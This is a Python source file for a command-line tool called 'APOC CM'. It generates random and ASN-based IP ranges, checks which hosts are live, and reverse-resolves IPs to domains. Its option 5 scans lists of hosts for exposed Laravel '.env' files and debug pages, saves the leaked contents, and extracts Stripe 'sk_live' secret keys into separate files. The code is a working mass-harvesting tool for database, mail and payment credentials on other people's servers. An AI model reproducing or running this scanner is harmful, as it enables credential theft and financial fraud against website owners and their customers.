from calendar import day_abbr, day_name, month
import os, json
from colorama import Fore, Back, Style
from colorama import init
import time
import requests
import requests, re, sys, os
import threading
import random
from re import findall as reg
import platform
import sys
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool
import warnings,random,socket,threading
from re import findall as reg
import requests, re, sys, os
from colorama import Fore, Style, Back
from colorama import init
from time import time as timer  
import concurrent.futures
import time
from multiprocessing.dummy import Pool
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from socket import gethostbyname
from socket import gaierror
from twilio.rest import Client
import random


init(convert=True)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[0m'
    red = Fore.RED
def clear():
    if platform.system()=="Windows":
        os.system("cls")
    else:
        os.system("clear")

white = Fore.WHITE
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
cyan = Fore.CYAN
res = Style.RESET_ALL
yl = Fore.YELLOW
red = Fore.RED
lightred = Fore.LIGHTRED_EX
black = Fore.BLACK
lightblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
lightwhite = Fore.LIGHTWHITE_EX
green = Fore.GREEN
lightgreen = Fore.LIGHTGREEN_EX
cyan = Fore.CYAN
lightcyan = Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lightyellow = Fore.LIGHTYELLOW_EX
blue = Fore.BLUE
lightlblue = Fore.LIGHTBLUE_EX
reset = Fore.RESET
r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
oo = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

# banr
def banr():

 print( Fore.RED + f"""                                                                    █████╗ ██████╗  ██████╗  ██████╗     ██████╗███╗   ███╗""")

 print(Fore.BLUE + f"""                                                                    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝████╗ ████║ """)

 print(Fore.RED + f"""                                                                    ███████║██████╔╝██║   ██║██║         ██║     ██╔████╔██║""")

 print(Fore.BLUE + f"""                                                                    ██╔══██║██╔═══╝ ██║   ██║██║         ██║     ██║╚██╔╝██║""")

 print(Fore.RED + f"""                                                                    ██║  ██║██║     ╚██████╔╝╚██████╗    ╚██████╗██║ ╚═╝ ██║""")

 print(Fore.BLUE + f"""                                                                    ╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝     ╚═════╝╚═╝     ╚═╝""")



numberoftimes = "No. Of Ips Generated >>>"
# SECOND LINE
madeby = f"""
                                                                                Made By @Shreyas_Apoc

                                                                                Telegram Channel - @Apoccm

                                                                                Telegram Group - @Apoccmchat

"""

number = f""" Number Of Ips Generated"""

Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50 " 
}

x = """]"""
iprangedtxt = f""" IP RANGED OF ASN - """
#OPTIONS
options = f"""

                                                            1. Ip Grabber From Asn                                      5. Env + Debug



                                                            2. Live Ip Check                                            6. 0/21 Adder



                                                            3.Ip Ranger                                                 7.Ip To Domain



                                                            4.Domain To Ip                                              8.Ip Gen 


                                                                                    9. Urls Gen  


"""

z = 0
y = 0
g = 0

#PRINT OF ABOVE AND COLORS

clear()
banr()
print(Fore.GREEN + madeby)
print(Fore.CYAN + options)

choice = input(Fore.MAGENTA + f"[APOCS] Please tell option to start >>>  ")

def check():
    while True:
        try:
            ip = iplines[0].replace("\n", "").replace("\r", "")
            iplines.pop(0)
        except:
            return
        try:
            r = requests.get(f'http://{ip}', timeout=5)
            if r.status_code == 200:
                print(green + f' » [+] {ip} LIVE IP')
                open('liveips.txt', 'a').write(ip + '\n')
            elif '<title>' in r.text:
                print(green + f' » [+] {ip} LIVE IP')
                open('liveips.txt', 'a').write(ip + '\n')
            elif '</body' in r.text:
                print(green + f' » [+] {ip} LIVE IP')
                open('liveips.txt', 'a').write(ip + '\n')
            elif '</html>' in r.text:
                print(green + f' » [+] {ip} LIVE IP')
                open('liveips.txt', 'a').write(ip + '\n')
            elif "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                print(green + f' » [+] {ip} LIVE IP WITH ENV')
            else:
                pass


        except Exception:
            pass
def agasthya():
   class xcol:
      LGREEN = '\033[38;2;129;199;116m'
      LRED = '\033[38;2;239;83;80m'
      RESET = '\u001B[0m'
      LXC = '\033[38;2;255;152;0m'
      GREY = '\033[38;2;158;158;158m'
   class ENV :
         def scan (self, url):
            rr = ''
            mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME','sk_live', 'APP_DEBUG', 'APP_ENV=']
            try:
               r = requests.get(f'http://{url}/.env', verify=False, timeout=10, allow_redirects=False)
               if r.status_code ==200:
                  resp = r.text
                  if any(key in resp for key in mch):
                     rr = f'{Fore.GREEN}[ENV]{Fore.RESET} : http://{url}'
                     with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                        output.write(f'{resp}\n')
                     if "sk_live" in resp:
                        file_object = open('SK_ENV.TXT', 'a')
                        file_object.write(f'ENV : {url}\n')
                        file_object.close()
                     lin = resp.splitlines( )
                     for x in lin:
                        if "sk_live" in x:
                           file_object = open('SK_LIVE.TXT', 'a')
                           file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                           file_object.close()
                  else :
                     rr = 'RE'
               else :
                  rr = 'RE'
            except :
               rr='RE'
            if 'RE' in rr :
               try:
                  proto = 'https'
                  r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
                  if r.status_code ==200:
                     resp = r.text
                     if any(key in resp for key in mch):
                        rr = f'{Fore.GREEN}[ENV]{Fore.RESET} : https://{url}'
                        with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                           output.write(f'{resp}\n')
                        if "sk_live" in resp:
                           file_object = open('SK_ENV.TXT', 'a')
                           file_object.write(f'ENV : {url}\n')
                           file_object.close()
                        lin = resp.splitlines( )
                        for x in lin:
                           if "sk_live" in x:
                              file_object = open('SK_LIVE.TXT', 'a')
                              file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                              file_object.close()
                     else:
                        rr = f'{Fore.RED} ENV [-] :{Fore.RESET} https://{url}'
                  else:
                     rr = f'{Fore.RED} ENV [-] :{Fore.RESET} https://{url}'
               except :
                  rr = f'{Fore.RED} ENV [*] :{Fore.RESET} https://{url}'
            print(rr+'/.env')
            try:
               data = {'debug': 'true'}
               r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
               resp = r.text
               if any(key in resp for key in mch):
                  rr = f'{Fore.GREEN}[+]{Fore.RESET} : https://{url}'
                  with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                     output.write(f'{resp}\n')
                  if "sk_live" in resp:
                     with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                        output.write(f'{resp}\n')
               else :
                  rr = f'{Fore.RED} DEBUG [-] :{Fore.RESET} https://{url}'
            except :
               rr = f'{Fore.RED} DEBUG [*] :{Fore.RESET} https://{url}'
            print(rr)
   if __name__ == '__main__':
      os.system('cls')
      banr()
      print(Fore.WHITE + madeby)
      if not os.path.isdir("ENVS"):
         os.makedirs("ENVS")
      if not os.path.isdir("DEBUG"):
         os.makedirs("DEBUG")
      if not os.path.isdir("SK"):
         os.makedirs("SK")
      threads = []
      while(True):
         try:
            thrd = int(input(Fore.GREEN +"[APOCS] THREADS : "+Fore.RESET))
            break
         except:
            pass
      while(True):
         try:
            inpFile = input(Fore.GREEN +"[APOCS] URLS PATH: "+Fore.RESET)
            with open(inpFile) as urlList:
               argFile = urlList.read().splitlines()
            break
         except:
            pass
      with ThreadPoolExecutor(max_workers=thrd) as executor:
         for data in argFile:
            threads.append(executor.submit(ENV().scan, data))
      quit()

if choice == "5":
    agasthya()

if choice == "9":
   clear()
   banr()
   print(Fore.CYAN + madeby)
   length = int(input("Enter The Amount: "))
   thread = int(input("\nThread: "))


   IPS = ""

   def ipranger():
      thread = 5000
      os.system('cls')
      while(True):
         try:
            inpFile = "ips.txt"
            with open(inpFile) as urlList:
               argFile = urlList.read().splitlines()
            break
         except:
            pass
      for data in argFile:
         try:

            with ThreadPoolExecutor(int(thread)) as pq:
                pq.map(reverse(data))

         except:

                  print("Error")

      quit()  

   def reverse(cidr):
      page = 0
      pg = 0
      urx = f'https://rapiddns.io/s/{cidr}?full=1&down=1#result'
      try :
            r = requests.get(urx, verify=False, allow_redirects=False)
            resp = re.sub("<th scope=\"row \">.*",">>>>>>>>>>>>>>>>>>urx",r.text).replace ("<div style=\"margin: 0 8px;\">Total: <span style=\"color: #39cfca; \">","XP>>>>>>>>>>>>>").replace ("</span></div>","")
            urxc = resp.splitlines( )
            urls = ""
            nm = 0
            for xc in urxc:
               nm += 1
               if ">>>>>>>>>>>>>>>>>>urx" in xc:
                  urls = urls+urxc[nm]+"\n"
            with open(os.path.join('', 'reversedbyapoccm.txt'), 'a') as output:
               piro =(f'{urls.replace("<td>","").replace ("</td>","")}')
               output.write(f'{piro}')
            print(f"[APOCS] REVERSED : {cidr}", end='\n')

      except Exception as e:
            pass

   def ranges(ip):
         try:
               part = ip.split('.')
               a = part[0]
               b = part[1]
               c = part[2]
               d = part[3]
               for d in range(1, 256):
                           ip_result = (str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d))
                           #print(green + "Ranged", cyan + "[", white +  ip , cyan + "]", yellow +' Ip', end = '\r' )
                           print(ip_result, end='                                                                ', flush=True)
                           #sys.stdout.write(ip_result)
                           #sys.stdout.flush()
                           open('IpRanged.txt','a').write(ip_result+"\n") 



         except:
               pass



   def gen():
      global IPS
      make = f"{random.randint(000,255)}.{random.randint(000,255)}.{random.randint(000,255)}.{random.randint(000,255)}"
      IPS += make + "\n"
      part = make.split('.')
      a = part[0]
      b = part[1]
      c = part[2]
      d = part[3]
      ip_result = (str(a) + '.' + str(b) + '.' + str(c) + '.' + "0/21")
      lol = ip_result
      reverse(lol)    



   with concurrent.futures.ThreadPoolExecutor(max_workers=(thread)) as executor:
         worker_to_queue = {
               executor.submit(gen): x for x in range(length)
         }
         for worker in concurrent.futures.as_completed(worker_to_queue):
               worker_to_queue[worker]

   with open('ips.txt', 'w') as f:
      f.write(IPS)
   print("[APOCS] Urls Stored in reversedbyapoccm.txt ")

if choice == "1":
    begin = time.time()
    time.sleep(1)
    clear()
    try:
        import requests
    except:
     os.system('pip install requests --user')
    try:
     import ipranges
    except:
        os.system('pip install ipranges --user')

    banr()
    print(Fore.LIGHTBLACK_EX + madeby)
    ASN = input(Fore.CYAN +'Enter A ASN  >> ')
    r = requests.get(f'https://api.bgpview.io/asn/{ASN}/prefixes').json()
    rather = r['data']['ipv4_prefixes']
    for Yh in range(0, int(len(rather)) - 1):
        IPM = r['data']['ipv4_prefixes'][Yh]
        Jahl = IPM['ip'] + '/' + str(IPM['cidr'])
        IPL = ipranges.IP4Net(Jahl)
        for IP in IPL:
            open(f'IPS_{ASN}.txt', 'a', errors='ignore', encoding='utf-8').write(f'{IP}\n')
            a = "["
            b = "]"
            ip = IP 
            txt = "IPs Found"
            asn = ASN
            z += 1
            last = time.time()
            timespend = "Time Taken In Seconds>> "
            tmtkn = f"""{last - begin}"""
            #print(cyan + a, ip,x, yl + iprangedtxt, gr + asn, Fore.LIGHTMAGENTA_EX + numberoftimes, z, white + timespend ,tmtkn ,end='\r')
            print( Fore.CYAN + txt, z,end='\r')

elif choice == "2":
        clear()
        banr()
        print( Fore.LIGHTBLACK_EX + madeby)



        file = open(input(lightgreen + f"Ip List File Path = "), 'r')

        iplines = file.readlines()

        last = iplines[len(iplines) - 1]


        thrds = int(input(yellow + "Threads » " + white))


        print(lightred + '\nChecking your Ips\n')

        threads = []
        for i in range(thrds):
            t = threading.Thread(target=check)
            t.daemon = True
            threads.append(t)

        for i in range(thrds):
            threads[i].start()

        for i in range(thrds):
            threads[i].join()

elif choice == "6": 
    clear()
    banr()
    print( Fore.GREEN + madeby)
    ip = open(input(cyan + f"Ips File Path = "), 'r').read().split("\n")
    thread = 1500
    def ranges(ip):
        try:
            part = ip.split('.')
            a = part[0]
            b = part[1]
            c = part[2]
            d = part[3]
            ip_result = (str(a) + '.' + str(b) + '.' + str(c) + '.' + "0/21")
                         #print(green + "Ranged", cyan + "[", white +  ip , cyan + "]", yellow +' Ip', end = '\r' )
            print(ip_result, end='                                                                ', flush=True)
                         #sys.stdout.write(ip_result)
                         #sys.stdout.flush()
            open('0BY21IPS.txt','a').write(ip_result+"\n") 



        except:
            pass


    if ip:  
       try:

          with ThreadPoolExecutor(int(thread)) as pq:
              pq.map(ranges,ip)

       except:

                 print("Error")

elif choice == "3": 
    clear()
    banr()
    print( Fore.GREEN + madeby)
    ip = open(input(cyan + f"Ips File Path = "), 'r').read().split("\n")
    thread = 1500
    def ranges(ip):
        try:
            part = ip.split('.')
            a = part[0]
            b = part[1]
            c = part[2]
            d = part[3]
            for d in range(1, 256):
               for c in range(1, 256):
                         ip_result = (str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d))
                         #print(green + "Ranged", cyan + "[", white +  ip , cyan + "]", yellow +' Ip', end = '\r' )
                         print(ip_result, end='                                                                ', flush=True)
                         #sys.stdout.write(ip_result)
                         #sys.stdout.flush()
                         open('IpRanged.txt','a').write(ip_result+"\n") 



        except:
            pass


    if ip:  
       try:

          with ThreadPoolExecutor(int(thread)) as pq:
              pq.map(ranges,ip)

       except:

                 print("Error")



if choice == "8":
    clear()
    banr()
    print(Fore.LIGHTMAGENTA_EX +madeby)
    length = int(input(Fore.GREEN + "Amount Of Ips >>> "))
    thread = int(input(Fore.CYAN + "\n\nThread: "))


    IPS = ""

    def gen():
        global IPS
        make = f"{random.randint(000,255)}.{random.randint(000,255)}.{random.randint(000,255)}.{random.randint(000,255)}"
        IPS += make + "\n"


    with concurrent.futures.ThreadPoolExecutor(max_workers=(thread)) as executor:
            worker_to_queue = {
                executor.submit(gen): x for x in range(length)
            }
            for worker in concurrent.futures.as_completed(worker_to_queue):
                worker_to_queue[worker]

    with open('ips.txt', 'w') as f:
        f.write(IPS)
    print(Fore.CYAN + "\n\n\nGenerated    Ips   " + Fore.GREEN + "\n\n* * Ips Stored  In ips.txt * *\n")

gg = "[+]"
fist = "[ Ip ="
scnd = "]"

def sitetoip(i):
    try:
        ip = gethostbyname(i)
        print(green + gg, yellow + i ,cyan +  fist , green + ip , cyan + scnd)
        open('ips.txt', 'a').write(ip + '\n')
    except:
        print('{}[-] '"{}""{} == ""{}[ ERROR ]".format(r, oo, i, o, r))

def d2i():


    lists = input( yellow + '\n [APOCS] Domains List Path >>>'.format(o, g, o, g))
    thread = input(green + '\n [APOCS] Thread >>> '.format(o, g, o, r))
    print('')
    try:
        domain = lists.replace('"','')
        process = open(domain, 'r').read().splitlines()
        with ThreadPoolExecutor(max_workers=int(thread)) as e:
            [e.submit(sitetoip, i) for i in process]
    except:
          print('{}[!] {}Incorrect'.format(o, r))

if choice == "4":
    clear()
    print(banr, lightblack + madeby)
    d2i()

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LBLUE = '\033[38;2;66;165;245m'
    GREY = '\033[38;2;158;158;158m'


def reverse(cidr):

      total = ""
      page = 0
      urx = f'https://rapiddns.io/s/{cidr}?full=1&down=1#result'
      try :
         r = requests.get(urx, verify=False, allow_redirects=False)
         resp = re.sub("<th scope=\"row \">.*",">>>>>>>>>>>>>>>>>>urx",r.text).replace ("<div style=\"margin: 0 8px;\">Total: <span style=\"color: #39cfca; \">","XP>>>>>>>>>>>>>").replace ("</span></div>","")
         urxc = resp.splitlines( )
         urls = ""
         nm = 0
         for xc in urxc:
            nm += 1
            if ">>>>>>>>>>>>>>>>>>urx" in xc:
               urls = urls+urxc[nm]+"\n"
         with open(os.path.join('', 'reversed.txt'), 'a') as output:
            output.write(f'{urls.replace("<td>","").replace ("</td>","")}')
         print(f"[SAVED] : {cidr}")
      except Exception as e:
         print(e)

if choice == "7":

   thread = 1500
   os.system('cls')
   while(True):
      try:
         inpFile = input(Fore.GREEN +"[IP PATH] : "+Fore.RESET)
         with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
         break
      except:
         pass
   for data in argFile:
      try:

        with ThreadPoolExecutor(int(thread)) as pq:
          pq.map(reverse(data))

      except:

                 print("Error")

   quit()  


